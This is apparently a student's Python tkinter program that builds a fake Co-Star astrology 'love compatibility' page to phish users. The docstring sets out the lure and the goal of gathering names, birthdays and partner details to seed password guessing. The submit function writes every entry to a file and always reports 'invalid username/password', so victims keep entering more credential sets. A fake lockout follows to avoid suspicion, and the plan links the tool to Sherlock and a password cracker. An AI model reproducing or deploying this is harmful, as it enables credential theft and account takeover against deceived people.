'''
FAUX-STAR:

This is a phishing site based on popular astrology iOS app Co-Star.
Co-Star has a paid-for feature for checking romantic compatibility. As phishing strategy, this site would be sent out
as a "beta feature for select loyal users to try for free".

I have made this on tkinter to demonstrate the usage of the entry forms, as I am not yet familiar with Flask,
however ideally this would be hosted as a web application. For tkinter, I have learned the widgets used below through
Angela Yu's 100 Days of Python course on Udemy.

The purpose of the phishing site is to gather more personal points of data for a primarily, personalised hybrid attack,
which is then supplemented by a hybrid attack based on leaked password lists, and common password practices/permutations.
These more personal points of data include:
- Target's name
- Target's birthday
- Target's lover's name
- Target's lover's birthday
- Username/password combinations used on Co-Star or other sites (*expanded upon below)

These inputs will be initialised in to two Person objects (see phished_data.py) that store each person-object (target, and
target's love) as attributes when the target hits submit. The Person-class also has init functions that generate possible
variations of passwords from their name and birthday data.

These inputs will be fed into the phished_data.txt file.

Importantly, there is a prompt for the target to input their username and password for Co-Star in order to log in for
their results. As with many iOS applications, users may sometimes use an email address or telephone number or app-native
username for their "username" entry. As well, it is common practice for users to have a set of passwords that are cycled
through between registrations. To capitalise on this common practice, when the submit button is pressed, the site feeds
the data into the Personal Data .txt files. The webpage will then update to say "Invalid Username / Password Combination." and
prompt the target to try again. This will lead the target to submitting additional log-in information, as they attempt
to log in to the site to see their compatibility results. After 5 submissions, the button becomes inactive and the website
updates to say "Too many attempts, please try again later" to not rouse suspicion.

Additionally, there are tools such as Sherlock, which can check emails against registrations and usernames across social
networks. As such, hackers can gain access to multiple accounts using just one data point of valid username/password.
Integration of Sherlock is beyond my scope of Python knowledge, however it would ideally be paired with my Password
Cracking program.
'''

'''
NOTE TO SELF:
SEE LINE 280 FOR BUTTON WRITING AND DATA PROCESSING.
'''

# ====================================== IMPORTS =================================================== #
import tkinter
from tkinter import *
from tkinter import ttk
import itertools


# ====================================== UI SETUP =================================================== #

# ---------------------------- STYLING CONSTANTS ------------------------------- #
# I tried to choose font styles and colours as close to the Co-Star styling as possible using generic fonts.

BODY_FONT = ("Andale Mono", 15, "normal")
BUTTON_FONT = ("Andale Mono", 13, "normal")
APP_FONT = ("Baskerville", 44, "normal")
TITLE_FONT = ("Baskerville", 30, "normal")
BACKGROUND_COLOUR = "white"
FONT_COLOUR = "#1d1d1d"


# ---------------------------- WINDOW SET-UP ------------------------------- #
window = Tk()
window.title("Faux-Star")
window.config(padx=50, pady=50, bg=BACKGROUND_COLOUR)


# ---------------------------- IMAGES ------------------------------- #
#All images are taken from Google Images: "Co-Star Icons", and converted to PNG for use in tkinter.
#COSTAR LOGO
canvas_title = Canvas(height=105, width=200, bg=BACKGROUND_COLOUR, highlightthickness=0)
logo_img = PhotoImage(file="Faux-Star GUI Graphics/Costar-Logo.png")
logo_img = logo_img.subsample(8,8)
canvas_title.create_image(100,55, image=logo_img)
canvas_title.grid(column=0,row=0, columnspan=4)

#COSTAR FLOWER
canvas = Canvas(height=200, width=200, bg=BACKGROUND_COLOUR, highlightthickness=0)
flower_img = PhotoImage(file="Faux-Star GUI Graphics/Costar-Flower.png")
flower_img = flower_img.subsample(4,4)
canvas.create_image(100,100, image=flower_img)
canvas.grid(column=0, row=1, columnspan=4)

#COSTAR MOTH
canvas = Canvas(height=100, width=200, bg=BACKGROUND_COLOUR, highlightthickness=0)
moth_img = PhotoImage(file="Faux-Star GUI Graphics/Costar_Moth.png")
moth_img = moth_img.subsample(5,5)
canvas.create_image(100,45, image=moth_img)
canvas.grid(column=0, row=11, columnspan=4)


#LOVE-COMPATIBILITY TITLE AND COPY
# Co-Star is known for its sometimes poetic, sometimes philosophical, and sometimes absurd copy.
# To emulate Co-Star's style of copy, I used ChatGPT and input the prompt "Write 10 short sayings about love, starting
# with the phrase 'for love to flourish', in the style of Confucious". I combined parts of several suggestions for the
# final copy.

body_label = Label(text="In love's garden", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
body_label.grid(column=0, row=2, columnspan=4)
title_label = Label(text="What seeds must we sow?\n", font=TITLE_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
title_label.grid(column=0, row=3, columnspan=4)
love_compatibility_label = Label(text="Love — Compatibility\nCalculator", font=APP_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
love_compatibility_label.grid(column=0, row=4, columnspan=4)
spacer_label = Label(textvariable="", font=BODY_FONT, background=BACKGROUND_COLOUR)
spacer_label.grid(column=0,row=5,columnspan=4)



# ---------------------------- DATE DROP-DOWN OPTIONS ------------------------------- #
months_num = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]
months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
days = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]+[str(i) for i in range (13,32)]
years = [str(i) for i in range (1900, 2024)] #1990-2023
years = years[::-1] #presents the years in reverse order, as is common UI

# STYLING THE COMBOBOX TO MATCH THE CO-STAR UI
combobox_style = ttk.Style()
combobox_style.theme_create('custom_style', parent='alt', settings={
    'TCombobox': {
        'configure': {
            'background': BACKGROUND_COLOUR,  # Background color of the drop-down list and the area behind the text
            'foreground': FONT_COLOUR,  # Text color
            'selectbackground': BACKGROUND_COLOUR,  # Background color of the selected item in the drop-down list
            'selectforeground': FONT_COLOUR,  # Text color of the selected item in the drop-down list
            'arrowcolor': FONT_COLOUR,  # Drop-down arrow color
            'bordercolor': BACKGROUND_COLOUR,  # Combobox border color
        }
    }
})
combobox_style.theme_use('custom_style')


# ---------------------------- YOUR INFO ENTRY AND UI ------------------------------- #
#NAME LABEL:
your_name_label = Label(text="YOUR FIRST NAME: ", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
your_name_label.grid(column=0, row=6)

#NAME ENTRY:
your_name_var = tkinter.StringVar()
your_name_entry = Entry(textvariable=your_name_var, width=33, foreground=FONT_COLOUR, background=BACKGROUND_COLOUR, insertbackground=FONT_COLOUR, highlightthickness=0, relief="groove")
your_name_entry.grid(column=1, row=6, columnspan=3)

#BIRTHDAY LABEL:
your_birthday_label = Label(text="YOUR BIRTHDAY: ", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
your_birthday_label.grid(column=0, row=7)

#BIRTHDAY COMBOBOX:
your_month_var = tkinter.StringVar()
your_day_var = tkinter.StringVar()
your_year_var = tkinter.StringVar()

month_menu_you = tkinter.ttk.Combobox(window, width=10, textvariable=your_month_var, values=months, state="readonly", style="custom_style.TCombobox")
month_menu_you.grid(column=1, row=7)

day_menu_you = ttk.Combobox(window, width=9, textvariable=your_day_var, values=days, state="readonly", style="custom_style.TCombobox")
day_menu_you.grid(column=2, row=7)

year_menu_you = ttk.Combobox(window, width=9, textvariable=your_year_var, values=years, state="readonly", style="custom_style.TCombobox")
year_menu_you.grid(column=3, row=7)



# ---------------------------- YOUR LOVE'S INFO ENTRY AND UI ------------------------------- #
#NAME LABEL:
love_name_label = Label(text="YOUR LOVE'S FIRST NAME: ", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
love_name_label.grid(column=0, row=8)

#NAME ENTRY:
love_name_var = tkinter.StringVar()
love_name_entry = Entry(textvariable=love_name_var, width=33, foreground=FONT_COLOUR, background=BACKGROUND_COLOUR, insertbackground=FONT_COLOUR, highlightthickness=0, relief="groove")
love_name_entry.grid(column=1, row=8, columnspan=3)

#BIRTHDAY LABEL:
love_birthday_label = Label(text="YOUR LOVE'S BIRTHDAY: ", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
love_birthday_label.grid(column=0, row=10)

#BIRTHDAY COMBOBOX:
love_month_var = tkinter.StringVar()
love_day_var = tkinter.StringVar()
love_year_var = tkinter.StringVar()

month_menu_love = tkinter.ttk.Combobox(window, width=10, textvariable=love_month_var, values=months, state="readonly", style="custom_style.TCombobox")
month_menu_love.grid(column=1, row=10)

day_menu_love = ttk.Combobox(window, width=9, textvariable=love_day_var, values=days, state="readonly", style="custom_style.TCombobox")
day_menu_love.grid(column=2, row=10)

year_menu_love = ttk.Combobox(window, width=9, textvariable=love_year_var, values=years, state="readonly", style="custom_style.TCombobox")
year_menu_love.grid(column=3, row=10)



# ---------------------------- SIGN IN UI ------------------------------- #
#ERROR MESSAGE LABEL
error_message_label = Label(text="", font=BUTTON_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
error_message_label.grid(column=0, row=12, columnspan=4)

#LOGIN PROMPT LABEL
login_prompt_label = Label(text="Log in to see results", font=TITLE_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
login_prompt_label.grid(column=0, row=13, columnspan=4)

username_label = Label(text="Username:", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
username_label.grid(column=0, row=14, columnspan=4)

username_var = tkinter.StringVar()
username_entry = Entry(textvariable=username_var, width=33, foreground=FONT_COLOUR, background=BACKGROUND_COLOUR, insertbackground=FONT_COLOUR, highlightthickness=0, relief="groove")
username_entry.grid(column=0, row=15, columnspan=4)
# username_entry.insert(0,"Username, Email or Tel")

password_label = Label(text="Password:", font=BODY_FONT, background=BACKGROUND_COLOUR, fg=FONT_COLOUR)
password_label.grid(column=0, row=16, columnspan=4)

password_var = tkinter.StringVar()
password_entry = Entry(textvariable=password_var, width=33, foreground=FONT_COLOUR, background=BACKGROUND_COLOUR, insertbackground=FONT_COLOUR, highlightthickness=0, relief="groove", show=
                       "*")
password_entry.grid(column=0, row=17, columnspan=4, padx=20)



# ====================================== SUBMIT BUTTON =================================================== #

# ---------------------------- CLASSES ----------------------------------- #
from phished_data import Person ## see phished_data.py for the attributes I wanted to store


# ---------------------------- BUTTON FUNCTION ------------------------------- #
error_message = "Invalid username/password.\nPlease try again."
lock_out_message = "Too many login attempts.\nPlease try again later."
log_in_to_see_message = "Please enter the username or telephone number\nand password registered with your account to log in."
enter_details_message = "Please input your details to see your compatibility."
counter = 0

def write_phished_data(list):
    print(f"\nNow writing {list} to phished_info.py\n")

    ### Opens phished_data.py and reads as a list
    with open("Dictionaries/phished_info.txt") as file:
        destination_dictionary = file.read()
    destination_dictionary = destination_dictionary.split("\n")

    ### For loop to add any words in the list that are not in the destination_dictionary list
    for word in list:
        if word not in destination_dictionary:
            destination_dictionary.append(word)

    ### Re-writes the appended list as the data file
    with open("Dictionaries/phished_info.txt", mode="w") as file:
        for word in destination_dictionary:
            ## added if statement so that the last entry does not add a space unnecessarily.
            file.write("\n" + word)

def clean():
    with open("Dictionaries/phished_info.txt") as file:
        dictionary = file.read()
    dictionary_clean = dictionary.split("\n")

    with open("Dictionaries/phished_info.txt", "w") as file:
        for word in dictionary_clean:
            word.strip()
            file.write("\n" + word)

    print("\nATTENTION: DELETE THE FIRST BLANK SPACES IN phished_info.txt")

def submit():
    global counter

    try: #getting all the submission data and converting to usable data:
        # Target and Target's Love's name and birthday data
        target = Person(label="Target", name=your_name_var.get().lower(), Month=your_month_var.get(), mm=months_num[months.index(your_month_var.get())], dd=your_day_var.get(), yyyy=your_year_var.get())
        love = Person(label="Love", name=love_name_var.get().lower(), Month=love_month_var.get(), mm=months_num[months.index(love_month_var.get())], dd= love_day_var.get(), yyyy= love_year_var.get())

        # Target's username and password attempt for logging into Co-star
        costar_username = username_var.get()
        if "@" in costar_username:  # if entry is an email address, slice at @
            i = costar_username.index("@")
            costar_username = costar_username[:i]
        costar_password = password_var.get()
        login_attempt = [costar_username, costar_password]


        if len(costar_password) != 0 and len(costar_username) != 0: #checks that there is valid info in the entry forms
            if counter == 0: #first attempt
                print("\nVictim captured!")
                print(f"Submission attempt: ({(counter+1)})")
                print(target.print_info())  ## prints entered info + alternative cases/formats & date combinations
                print(love.print_info())
                print(f"Entered Username/Password: {login_attempt}")
                write_phished_data(target.all_entry)
                write_phished_data(love.all_entry)
                write_phished_data(login_attempt)
                error_message_label.config(text=error_message) #Show error message on the phishing site to another encourage login attempt
                counter += 1

            elif counter < 5: #takes 4 more attempts for additional username/passwords before lockout
                ## Don't take in the name/birthday info after the first submit as the target is not likely to change it.
                print("\nVictim captured!")
                print(f"Submission attempt: ({(counter+1)})")
                print(f"Entered Username/Password: {login_attempt}")
                error_message_label.config(text=error_message) #Show error message on the phishing site to another encourage login attempt
                counter +=1

            else:
                # Shows a lock out message for too many login attempts -- makes phishing site look more legitimate.
                error_message_label.config(text=lock_out_message)

        else:
            # Prompts target to enter username/password if entry boxes are empty.
            error_message_label.config(text=log_in_to_see_message)

    except ValueError:  # Catches value error when no details are entered prior to submit button
        error_message_label.config(text=enter_details_message)

    clean()


# ---------------------------- BUTTON UI ------------------------------- #

submit_button = Button(text="SUBMIT", width=34, activebackground="black", font=BUTTON_FONT, highlightthickness=2, bd=2, highlightbackground="white", command=submit)
submit_button.grid(column=0, row=18, columnspan=4)



window.mainloop()